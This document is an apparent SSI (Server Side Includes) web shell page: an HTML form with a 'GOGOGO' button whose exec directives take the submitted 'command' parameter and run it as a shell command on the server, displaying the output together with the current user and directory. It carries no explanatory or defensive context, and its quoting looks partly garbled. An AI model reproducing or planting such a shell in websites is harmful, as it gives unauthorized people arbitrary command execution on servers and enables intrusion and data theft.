<hr>
<form action=<!--#echo var="script_name"--> method=get>
[<!--#exec cmd="echo -n 'whoami'"-->@ <!--#exec cmd="echo -n 'pwd'"-->]$
<input type=text name=command value='' size=40>
<input type=submit value='GOGOGO'>
</form>
<hr><XMP><!--#exec cmd="'echo ${query_string_unscaped}|\sed 's,^command=,,g'|sed 's,+, ,g''"-->
</XMP><hr>

